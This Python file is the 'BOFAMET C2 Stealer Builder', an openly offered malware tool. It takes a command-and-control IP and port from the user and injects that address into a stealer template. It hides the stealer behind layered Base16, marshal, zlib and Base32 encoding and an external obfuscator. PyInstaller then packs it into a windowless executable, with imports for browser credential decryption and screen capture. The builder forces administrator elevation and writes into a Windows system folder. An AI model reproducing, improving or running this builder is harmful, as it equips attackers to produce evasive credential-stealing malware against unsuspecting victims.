import subprocess
import os
import shutil
import sys
import base64
import zlib
import marshal
import colorama
import ctypes
import atexit

CR = colorama.Fore.RED + colorama.Style.BRIGHT
CG = colorama.Fore.GREEN + colorama.Style.BRIGHT
CY = colorama.Fore.YELLOW + colorama.Style.BRIGHT
CB = colorama.Fore.BLUE + colorama.Style.BRIGHT
CM = colorama.Fore.MAGENTA + colorama.Style.BRIGHT
CC = colorama.Fore.CYAN + colorama.Style.BRIGHT
CW = colorama.Fore.WHITE + colorama.Style.BRIGHT

if getattr(sys, 'frozen', False):
    dll_path = os.path.join(sys._MEIPASS, "openobf.dll")
    os.environ['PATH'] = dll_path + os.pathsep + os.environ['PATH']

colorama.init(autoreset=True)

LOG_FILENAME = "builder_log.txt"
try:
    log_file = open(LOG_FILENAME, 'a+', encoding='utf-8', errors='ignore')
except Exception as e_log_open:
    print(f"CRITICAL: Could not open log file {LOG_FILENAME}: {e_log_open}")
    log_file = None


class Tee:
    def __init__(self, *files):
        self.files = [f for f in files if f is not None]

    def write(self, obj):
        for f in self.files:
            try:
                f.write(str(obj))
                f.flush()
            except Exception:
                pass

    def flush(self):
        for f in self.files:
            try:
                f.flush()
            except Exception:
                pass


if log_file:
    sys.stdout = Tee(sys.stdout, log_file)
    sys.stderr = Tee(sys.stderr, log_file)
    atexit.register(log_file.close)
    print(f"\n--- Logging started to {LOG_FILENAME} ---")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if sys.platform == 'win32':
    if not is_admin():
        print(f"{colorama.Fore.YELLOW}BOFAMET BUILDER: Administrator rights are required to create the build.")
        print(
            f"{colorama.Fore.YELLOW}BOFAMET BUILDER: Attempting to restart with administrator rights... Confirm the UAC prompt.{colorama.Style.RESET_ALL}")
        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",
                sys.executable,
                f'"{sys.argv[0]}" ',
                None,
                1
            )
            if result <= 32:
                print(
                    f"{colorama.Fore.RED}BOFAMET BUILDER: Error attempting to restart with admin rights (Code: {result}). Try running manually as Administrator.{colorama.Style.RESET_ALL}")
            sys.exit()
        except Exception as e_elevate:
            print(f"{colorama.Fore.RED}BOFAMET BUILDER: Exception during restart attempt", sys.exit(1))

from pystyle import Anime, Colors, Colorate, Center
from ctypes import wintypes

hWnd = ctypes.windll.kernel32.GetConsoleWindow()

user32 = ctypes.windll.user32
screenWidth = user32.GetSystemMetrics(0)
screenHeight = user32.GetSystemMetrics(1)
rect = wintypes.RECT()
ctypes.windll.user32.GetWindowRect(hWnd, ctypes.pointer(rect))

windowWidth = rect.right - rect.left
windowHeight = rect.bottom - rect.top

newX = int((screenWidth - windowWidth) / 2)
newY = int((screenHeight - windowHeight) / 2)

ctypes.windll.user32.MoveWindow(hWnd, newX, newY, windowWidth, windowHeight, True)

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
                         Welcome to BOFAMET C2 builder!
             
                       .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '             
                          Press ENTER to continue...
"""

Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interval=0.045, enter=True)

if os.name == "nt":
    os.system("cls")
    os.system("title BOFAMET_C2_builder")
if os.name == "posix":
    os.system("clear")

def _copy_and_verify_local_pyinstaller(source_exe_path: str, local_dest_path: str) -> str | None:
    try:
        if os.path.exists(local_dest_path):
            os.remove(local_dest_path)
            print(
                f"{CY}BOFAMET BUILDER:{CW} Old local copy ({local_dest_path}) deleted before copying new one.")
        shutil.copy2(source_exe_path, local_dest_path)
        print(f"{CG}BOFAMET BUILDER:{CW} PyInstaller from '{source_exe_path}' successfully copied to '{local_dest_path}'.")
        print(f"{CY}BOFAMET BUILDER:{CW} Verifying local PyInstaller copy ({local_dest_path})...")
        check_command_local = [local_dest_path, "--version"]
        process_local = subprocess.run(
            check_command_local,
            capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore'
        )
        print(
            f"{CG}BOFAMET BUILDER:{CW} Local PyInstaller copy ({local_dest_path}) is working. Version: {process_local.stdout.strip()}.")
        return local_dest_path
    except Exception as e:
        print(
            f"{CR}BOFAMET BUILDER: Error! Problem copying or verifying local copy from '{source_exe_path}' to '{local_dest_path}': {e}")
        if os.path.exists(local_dest_path):
            try:
                os.remove(local_dest_path)
            except Exception as e_del:
                print(f"{CR}BOFAMET BUILDER: Failed to delete this file ({local_dest_path}) too: {e_del}")
        return None


def ensure_pyinstaller():
    LOCAL_PYINSTALLER_NAME = "pyinstaller_local.exe"
    local_pyinstaller_dest_path = os.path.join(os.getcwd(), LOCAL_PYINSTALLER_NAME)

    print(
        f"{CY}BOFAMET BUILDER:{CW} Attempt 1: Searching for PyInstaller in common Python user directories...")
    user_appdata_local = os.getenv('LOCALAPPDATA')
    user_appdata_roaming = os.getenv('APPDATA')
    potential_user_paths = []

    if user_appdata_local:
        for py_version in range(8, 15): # Search for Python 3.8 to 3.14
            potential_user_paths.append(os.path.join(user_appdata_local, f"Programs\\Python\\Python3{py_version}\\Scripts\\pyinstaller.exe"))
    if user_appdata_roaming:
        for py_version in range(8, 15):
            potential_user_paths.append(os.path.join(user_appdata_roaming, f"Python\\Python3{py_version}\\Scripts\\pyinstaller.exe"))

    found_user_pyinstaller_path = None
    for path in potential_user_paths:
        if os.path.isfile(path):
            print(f"{CG}BOFAMET BUILDER:{CW} Found potential PyInstaller in user folder: {path}.")
            result_path = _copy_and_verify_local_pyinstaller(path, local_pyinstaller_dest_path)
            if result_path:
                print(
                    f"{CG}BOFAMET BUILDER:{CW} User's PyInstaller copy copied and verified: {result_path}!")
                return result_path
            else:
                print(
                    f"{CY}BOFAMET BUILDER:{CW} Failed to use the found PyInstaller: {path}. Searching further.")
    print(f"{CY}BOFAMET BUILDER:{CW} PyInstaller not found in user locations. Searching further.")

    print(f"\n{CY}BOFAMET BUILDER:{CW} Attempt 2: Searching for system PyInstaller...")
    system_pyinstaller_path = shutil.which('pyinstaller')
    if system_pyinstaller_path:
        print(
            f"{CG}BOFAMET BUILDER:{CW} System PyInstaller found here: {system_pyinstaller_path}. Copying it locally...")
        result_path = _copy_and_verify_local_pyinstaller(system_pyinstaller_path, local_pyinstaller_dest_path)
        if result_path:
            print(
                f"{CG}BOFAMET BUILDER:{CW} System PyInstaller copied, verified, and ready to work as {result_path}!")
            return result_path
        else:
            print(
                f"{CY}BOFAMET BUILDER:{CW} Failed to use system PyInstaller. Last hope - installation via pip.")
    else:
        print(f"{CY}BOFAMET BUILDER:{CW} System PyInstaller not found. Installing it via pip.")

    print(f"\n{CY}BOFAMET BUILDER:{CW} Attempt 3: Installing PyInstaller via pip...")
    try:
        pip_command = [sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"]
        print(f"{CY}BOFAMET BUILDER:{CW} Executing command: {' '.join(pip_command)}")
        install_process = subprocess.run(
            pip_command,
            capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore'
        )
        print(f"{CG}BOFAMET BUILDER:{CW} PyInstaller successfully installed/updated via pip!")

        print(f"{CY}BOFAMET BUILDER:{CW} Searching for path to freshly installed PyInstaller...")
        installed_pyinstaller_path = shutil.which('pyinstaller')
        if installed_pyinstaller_path:
            print(
                f"{CG}BOFAMET BUILDER:{CW} Freshly installed PyInstaller found here: {installed_pyinstaller_path}. Copying it locally for full control...")
            result_path = _copy_and_verify_local_pyinstaller(installed_pyinstaller_path, local_pyinstaller_dest_path)
            if result_path:
                print(
                    f"{CG}BOFAMET BUILDER:{CW} Freshly installed PyInstaller is now under our control as {result_path}!")
                return result_path
            else:
                print(
                    f"{CR}BOFAMET BUILDER:{CW} Error, even after installation, failed to prepare a local copy. This is a problem.")
        else:
            print(
                f"{CR}BOFAMET BUILDER:{CW} Strange! PyInstaller seems to be installed, but cannot be found via shutil.which. This is unexpected.")
    except subprocess.CalledProcessError as install_e:
        print(f"{CR}BOFAMET BUILDER: Too bad! Failed to install PyInstaller via pip. Error:")
        if install_e.stdout: print(f"{CR}Stdout: {install_e.stdout.strip()}")
        if install_e.stderr: print(f"{CR}Stderr: {install_e.stderr.strip()}")
        print(f"{CR}Try installing PyInstaller manually: {sys.executable} -m pip install pyinstaller")
    except FileNotFoundError:
        print(
            f"{CR}BOFAMET BUILDER: The 'pip' command not found via '{sys.executable} -m pip'. Looks like your Python setup is incomplete.")
    except Exception as general_e:
        print(f"{CR}BOFAMET BUILDER: Some unforeseen problem occurred during PyInstaller installation: {general_e}")
    print(
        f"{CR}BOFAMET BUILDER: All attempts to prepare a local copy of PyInstaller have failed. Build aborted, you couldn't do it.")
    return None


def obfuscate_final_stealer_code(source_code: str, c2_server_url_to_inject: str) -> str:
    PLACEHOLDER = "{{C2_SERVER_URL_PLACEHOLDER}}"
    if PLACEHOLDER in source_code:
        source_code = source_code.replace(PLACEHOLDER, c2_server_url_to_inject)
        print(f"{CG}BOFAMET BUILDER:{CW} Injected C2 server URL: {c2_server_url_to_inject}")
    else:
        print(f"{CR}BOFAMET BUILDER: WARNING! C2 server URL placeholder '{PLACEHOLDER}' not found in stealer code. C2 URL might be hardcoded or missing!")

    current_code_for_processing = source_code
    data_for_processing = b""
    last_known_good_executable_code = source_code
    current_stage_name = "Original Code"
    print(f"{CC}BOFAMET BUILDER:{CW} {current_stage_name} -> Stage 1: Base16 Encoding...")
    temp_b16_wrapped_code = ""
    try:
        b16_encoded_bytes = base64.b16encode(current_code_for_processing.encode('utf-8'))
        b16_hex_string = b16_encoded_bytes.decode('ascii')
        temp_b16_wrapped_code = f"import base64, zlib, marshal, colorama; colorama.init(autoreset=True); exec(base64.b16decode('{b16_hex_string}').decode('utf-8'))"
        current_code_for_processing = temp_b16_wrapped_code
        last_known_good_executable_code = temp_b16_wrapped_code
        current_stage_name = "Code after Base16 wrapper"
        print(f"{CG}BOFAMET BUILDER:{CW} {current_stage_name} - Success.")
    except Exception as e:
        print(f"{CR}BOFAMET BUILDER: Error in Base16 stage: {e}. Subsequent stages will be applied to ORIGINAL code.")
        import traceback;
        traceback.print_exc()
    print(f"{CC}BOFAMET BUILDER:{CW} {current_stage_name} -> Stage 2: Compilation and Marshal...")
    try:
        compiled_code_obj = compile(current_code_for_processing, '<string>', 'exec')
        data_for_processing = marshal.dumps(compiled_code_obj)
        current_stage_name = "Bytecode after Marshal"
        print(f"{CG}BOFAMET BUILDER:{CW} {current_stage_name} - Success.")
    except Exception as e:
        print(f"{CR}BOFAMET BUILDER: Error in Compile/Marshal stage: {e}. Reverting to last working code.")
        import traceback;
        traceback.print_exc()
        return last_known_good_executable_code
    print(f"{CC}BOFAMET BUILDER:{CW} {current_stage_name} -> Stage 3: Zlib Compression...")
    try:
        data_for_processing = zlib.compress(data_for_processing, level=9)
        current_stage_name = "Compressed bytes after Zlib"
        print(f"{CG}BOFAMET BUILDER:{CW} {current_stage_name} - Success.")
    except Exception as e:
        print(f"{CR}BOFAMET BUILDER: Error in Zlib compression stage: {e}. Reverting to last working code.")
        import traceback;
        traceback.print_exc()
        return last_known_good_executable_code
    print(
        f"{CC}BOFAMET BUILDER:{CW} {current_stage_name} -> Stage 4: Base32 Encoding and creating loader for openpy...")
    intermediate_loader_code_for_openpy = ""
    try:
        b32_encoded_bytes = base64.b32encode(data_for_processing)
        b32_string = b32_encoded_bytes.decode('ascii')
        intermediate_loader_code_for_openpy = f"import marshal, base64, zlib, colorama; colorama.init(autoreset=True); exec(marshal.loads(zlib.decompress(base64.b32decode(r'''{b32_string}'''))))"
        last_known_good_executable_code = intermediate_loader_code_for_openpy
        current_stage_name = "Loader after Base32 (for openpy)"
        print(f"{CG}BOFAMET BUILDER:{CW} {current_stage_name} - Successfully created.")
    except Exception as e:
        print(
            f"{CR}BOFAMET BUILDER: Error in Base32/loader creation stage: {e}. Reverting to last working code.")
        import traceback;
        traceback.print_exc()
        return last_known_good_executable_code
    print(f"{CC}BOFAMET BUILDER:{CW} {current_stage_name} -> Stage 5: Obfuscation with openpy.exe...")
    openpy_executable_name = "openpy.exe"
    final_obfuscated_code = ""
    resources_dir = os.path.join(os.getcwd(), "Resources")
    openpy_path = os.path.join(resources_dir, openpy_executable_name)
    if not (os.path.isfile(openpy_path) and os.access(openpy_path, os.X_OK)):
        print(
            f"{CY}BOFAMET BUILDER:{CW} WARNING: {openpy_executable_name} not found or not executable in './Resources/' folder. Skipping openpy obfuscation stage.")
        return last_known_good_executable_code
    print(f"{CG}BOFAMET BUILDER:{CW} Found {openpy_executable_name} in Resources folder: {openpy_path}")
    temp_openpy_input_filename = "_temp_bofamet_openpy_in.py"
    temp_openpy_output_filename = "_temp_bofamet_openpy_in_openobf.py"
    try:
        with open(temp_openpy_input_filename, "w", encoding="utf-8") as f:
            f.write(intermediate_loader_code_for_openpy)
        print(f"{CC}BOFAMET BUILDER:{CW} Temporary file for openpy.exe created: {temp_openpy_input_filename}")
        print(f"{CC}BOFAMET BUILDER:{CW} Running: {openpy_path} -obf {temp_openpy_input_filename}")
        process = subprocess.run(
            [openpy_path, "-obf", temp_openpy_input_filename],
            capture_output=True, text=True, check=False, encoding='utf-8', errors='ignore'
        )
        if process.returncode != 0:
            print(f"{CR}BOFAMET BUILDER: {openpy_executable_name} exited with an error (code: {process.returncode}).")
            if process.stdout: print(f"{CW}Stdout:\n{process.stdout}")
            if process.stderr: print(f"{CR}Stderr:\n{process.stderr}")
            print(f"{CY}BOFAMET BUILDER:{CW} Using code before {openpy_executable_name} stage.")
            return last_known_good_executable_code
        if not os.path.exists(temp_openpy_output_filename):
            print(
                f"{CR}BOFAMET BUILDER: {openpy_executable_name} seems to have run, but output file {temp_openpy_output_filename} not found!")
            print(f"{CY}BOFAMET BUILDER:{CW} Using code before {openpy_executable_name} stage.")
            return last_known_good_executable_code
        with open(temp_openpy_output_filename, "r", encoding="utf-8") as f:
            final_obfuscated_code = f.read()
        print(f"{CG}BOFAMET BUILDER: Code successfully obfuscated via Base16->Marshal->Zlib->Base32->openpy!")
        return final_obfuscated_code
    except Exception as e:
        print(f"{CR}BOFAMET BUILDER: An error occurred while working with {openpy_executable_name}: {e}")
        import traceback;
        traceback.print_exc()
        print(f"{CY}BOFAMET BUILDER:{CW} Using code before {openpy_executable_name} stage.")
        return last_known_good_executable_code
    finally:
        for temp_file in [temp_openpy_input_filename, temp_openpy_output_filename]:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                    print(f"{CC}BOFAMET BUILDER:{CW} Temporary file {temp_file} deleted.")
                except Exception as e_rem_temp:
                    print(f"{CR}BOFAMET BUILDER: Failed to delete temporary file {temp_file}: {e_rem_temp}")


def Load_base():
    with open("Resources\\example.py", "r", encoding="utf-8") as f:
        STEALER_CODE_TEMPLATE = f.read()
        return STEALER_CODE_TEMPLATE


def build_stealer_exe():
    output_exe_name = "BOFAMET_BUILD.exe"
    temp_dir = "C:\\Windows\\Installer"
    temp_build_script_filename = "_temp_stealer_for_build.py"
    temp_build_script_path = os.path.join(temp_dir, temp_build_script_filename)

    def clear_console():
        os.system('cls' if os.name == 'nt' else 'clear')

    while True:
        clear_console()
        print(f"""
{CR}

██████╗  ██████╗ ███████╗ █████╗ ███╗   ███╗███████╗████████╗     ██████╗██████╗ 
██╔══██╗██╔═══██╗██╔════╝██╔══██╗████╗ ████║██╔════╝╚══██╔══╝    ██╔════╝╚════██╗
██████╔╝██║   ██║█████╗  ███████║██╔████╔██║█████╗     ██║       ██║      █████╔╝
██╔══██╗██║   ██║██╔══╝  ██╔══██║██║╚██╔╝██║██╔══╝     ██║       ██║     ██╔═══╝ 
██████╔╝╚██████╔╝██║     ██║  ██║██║ ╚═╝ ██║███████╗   ██║       ╚██████╗███████╗
╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝   ╚═╝        ╚═════╝╚══════╝
                                                                                 
""")
        print(f"{CM}BOFAMET C2 Stealer Builder                             @RigOlit")
        print(f"{CB}{'-' * 60}")
        print(f"\n{CM}--- BOFAMET Menu ---")
        print(f"{CY}[1] Build Stealer")
        print(f"{CY}[2] Creator Information")
        print(f"{CY}[3] Exit")
        print(f"{CB}{'-' * 60}")
        choice = input(f"{CB}Choose an option (1-3): {CW}")
        print(f"{CB}{'-' * 60}")
        clear_console()

        pyinstaller_local_exe_path = None

        if choice == '1':
            pyinstaller_local_exe_path = ensure_pyinstaller()
            if not pyinstaller_local_exe_path:
                print(
                    f"{CR}BOFAMET BUILDER: Failed to prepare local PyInstaller copy. Build aborted.{CW}")
                input(f"{CY}Press Enter to return to menu...{CW}")
                continue
            pyinstaller_base_command = [pyinstaller_local_exe_path]
            print(
                f"{CG}BOFAMET BUILDER:{CW} Local PyInstaller copy will be used: {pyinstaller_local_exe_path}")
            print(f"\n{CM}--- Build Parameters Configuration ---")
            icon_path = None
            add_icon = input(f"{CY}[?] Do you want to add an icon (.ico) to the build? (y/n): {CW}").lower()
            if add_icon == 'y':
                icon_input_path = input(f"{CY}[?] Provide the FULL path to your .ico file: {CW}")
                if os.path.isfile(icon_input_path) and icon_input_path.lower().endswith('.ico'):
                    icon_path = os.path.abspath(icon_input_path)
                    print(f"{CG}[+] Icon found and path absolutized: {icon_path}")
                else:
                    print(f"{CR}[-] Icon file not found or it's not a .ico: {icon_input_path}")
                    print(f"{CY}[-] Build will proceed without an icon.")
            else:
                print(f"{CY}[-] Building without an icon.")
            print(f"{CB}{'-' * 60}")

            print(f"\n{CM}--- C2 Server Configuration ---")
            while True:
                c2_ip = input(f"{CY}[?] Enter your C2 Server IP address (e.g., 0.0.0.0): {CW}").strip()
                if c2_ip:
                    break
                else:
                    print(f"{CR}ERROR: C2 IP cannot be empty. Please enter a valid IP address.{CW}")
            
            while True:
                c2_port = input(f"{CY}[?] Enter your C2 Server Port (e.g., 8000): {CW}").strip()
                if c2_port and c2_port.isdigit():
                    break
                else:
                    print(f"{CR}ERROR: C2 Port must be a number and cannot be empty. Please enter a valid port.{CW}")

            c2_server_url = f"http://{c2_ip}:{c2_port}"
            print(f"{CG}BOFAMET BUILDER:{CW} C2 Server URL set to: {c2_server_url}")
            print(f"{CB}{'-' * 60}")

            stealer_code = Load_base()
            final_code_for_build = obfuscate_final_stealer_code(stealer_code, c2_server_url)
            try:
                os.makedirs(temp_dir, exist_ok=True)
                with open(temp_build_script_path, "w", encoding="utf-8") as f:
                    f.write(final_code_for_build)
                print(f"\n{CC}BOFAMET BUILDER:{CW} Temporary file created.")
            except PermissionError:
                print(
                    f"{CR}BOFAMET BUILDER: ACCESS ERROR! Cannot create temporary file. Run the script as Administrator!{CW}")
                input(f"{CY}Press Enter to return to menu...{CW}")
                continue
            except Exception as e_write:
                print(f"{CR}BOFAMET BUILDER: Error writing temporary file: {e_write}{CW}")
                input(f"{CY}Press Enter to return to menu...{CW}")
                continue
            print(f"{CC}BOFAMET BUILDER:{CW} Starting file compilation ...")
            pyinstaller_options = [
                "--clean",
                "--onefile",
                "--noconsole",
                "--hidden-import=colorama",
                "--hidden-import=PIL",
                "--hidden-import=PIL.ImageGrab",
                "--hidden-import=datetime",
                "--hidden-import=zipfile",
                "--hidden-import=win32crypt",
                "--hidden-import=base64",
                "--hidden-import=Crypto.Cipher.AES",
                "--hidden-import=ctypes",
                "--hidden-import=ctypes.wintypes",
                "--hidden-import=getpass",
                "--hidden-import=socket",
                "--hidden-import=uuid",
                "--hidden-import=aiofiles",
                "--hidden-import=sqlite3",
                "--hidden-import=platform",
                "--hidden-import=os",
                "--hidden-import=re",
                "--hidden-import=requests",
                "--hidden-import=asyncio",
                "--hidden-import=typing",
                "--hidden-import=concurrent.futures",
                "--hidden-import=random",
                "--hidden-import=subprocess",
                "--hidden-import=shutil",
                "--hidden-import=psutil",
                "--hidden-import=json",
                "--name", output_exe_name,
            ]
            if icon_path:
                pyinstaller_options.append(f"--icon={icon_path}")
            resources_dir_for_dll = os.path.join(os.getcwd(), "Resources")
            dll_name = "openobf.dll"
            dll_full_path = os.path.join(resources_dir_for_dll, dll_name)
            if os.path.isfile(dll_full_path):
                print(f"{CG}BOFAMET BUILDER:{CW} Found {dll_name} in {resources_dir_for_dll}. Adding to build.")
                pyinstaller_options.append(f"--add-binary={dll_full_path}{os.pathsep}.")
            else:
                print(
                    f"{CR}BOFAMET BUILDER:{CW} WARNING: {dll_name} not found in {resources_dir_for_dll}. DLL will not be added to the build. This may lead to runtime errors of the final file!")
            pyinstaller_options.append(temp_build_script_path)
            pyinstaller_command = pyinstaller_base_command + pyinstaller_options
            try:
                print(f"\n{CB}BOFAMET BUILDER: Executing build:{CW}\n{CW}{' '.join(pyinstaller_command)}")
                process = subprocess.Popen(pyinstaller_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                           text=True, encoding='utf-8', errors='ignore')
                stdout, stderr = process.communicate()
                print(f"{CB}--- PyInstaller Output --- {CW}(Return Code: {process.returncode}){CB} ---{CW}")
                if stdout:
                    print(f"{CW}{stdout}")
                if stderr:
                    print(f"{CR}{stderr}")
                print(f"{CB}{'-' * 60}{CW}")
                if process.returncode == 0:
                    print(f"{CG}BOFAMET BUILDER: All done! Your {output_exe_name} is in the 'dist' folder.")
                    dist_folder = os.path.join(os.getcwd(), "dist")
                    if os.path.isdir(dist_folder):
                        try:
                            if sys.platform == "win32":
                                os.startfile(dist_folder)
                            elif sys.platform == "darwin":
                                subprocess.Popen(["open", dist_folder])
                            else:
                                subprocess.Popen(["xdg-open", dist_folder])
                            print(f"{CG}BOFAMET BUILDER: Folder {dist_folder} will open now.")
                        except Exception as e_open:
                            print(f"{CR}BOFAMET BUILDER: Failed to open folder {dist_folder}: {e_open}")
                else:
                    print(f"{CR}BOFAMET BUILDER: ERROR! PyInstaller returned an error (see output above).")
            except FileNotFoundError:
                print(f"{CR}BOFAMET BUILDER: ERROR! PyInstaller not found. (pip install PyInstaller)")
            except Exception as e:
                print(f"{CR}BOFAMET BUILDER: An error occurred during the build: {e}")
            finally:
                print(f"\n{CB}--- Cleaning up temporary files ---{CW}")
                if os.path.exists(temp_build_script_path):
                    try:
                        os.remove(temp_build_script_path)
                        print(f"{CC}BOFAMET BUILDER:{CW} Temporary script file deleted.")
                    except PermissionError:
                        print(
                            f"{CR}BOFAMET BUILDER: ACCESS ERROR! Cannot delete temporary file. Administrator rights may be needed.{CW}")
                    except Exception as e_rem:
                        print(f"{CR}BOFAMET BUILDER: Failed to delete temporary file: {e_rem}{CW}")
                if os.path.exists(f"{output_exe_name}.spec"):
                    os.remove(f"{output_exe_name}.spec")
                    print(f"{CC}BOFAMET BUILDER:{CW} File {output_exe_name}.spec deleted.")
                build_dir = os.path.join(os.getcwd(), "build")
                if os.path.isdir(build_dir):
                    try:
                        shutil.rmtree(build_dir)
                        print(f"{CC}BOFAMET BUILDER:{CW} 'build' folder from PyInstaller deleted.")
                    except Exception as e:
                        print(f"{CR}BOFAMET BUILDER: Failed to delete 'build' folder from PyInstaller: {e}")
                if pyinstaller_local_exe_path and os.path.exists(pyinstaller_local_exe_path):
                    expected_local_name = "pyinstaller_local.exe"
                    if os.path.basename(pyinstaller_local_exe_path) == expected_local_name:
                        try:
                            os.remove(pyinstaller_local_exe_path)
                            print(
                                f"{CC}BOFAMET BUILDER:{CW} Local PyInstaller copy ({pyinstaller_local_exe_path}) deleted.")
                        except Exception as e_del_pyi:
                            print(
                                f"{CR}BOFAMET BUILDER: Failed to delete local PyInstaller copy ({pyinstaller_local_exe_path}): {e_del_pyi}")
                    else:
                        print(
                            f"{CY}BOFAMET BUILDER:{CW} Path {pyinstaller_local_exe_path} does not match expected local copy name ({expected_local_name}), so the file is not deleted for safety reasons.")
            input(f"\n{CY}Build completed (or failed). Press Enter to return to main menu...{CW}")
        elif choice == '2':
            print(f"\n{CM}--- About Developers ---")
            print(f"{CW}   - @RigOlit")
            print(f"{CW}   - @Wrench_MeowSec")
            print(f"{CW}   - @exposedorigin")
            print(f"{CW}SUBSCRIBE TO THE CHANNEL TO NOT MISS UPDATES: @Rigolit22   (https://t.me/Rigolit22)")
            print(f"{CB}{'-' * 60}")
            input(f"{CY}Press Enter to return to menu...{CW}")
        elif choice == '3':
            clear_console()
            print(f"{CG}BOFAMET BUILDER: Shutting down{CW}")
            break
        else:
            print(f"{CR}BOFAMET BUILDER: Invalid option. Enter a number from 1 to 3.{CW}")
            input(f"{CY}Press Enter to return to menu...{CW}")


if __name__ == "__main__":
    build_stealer_exe()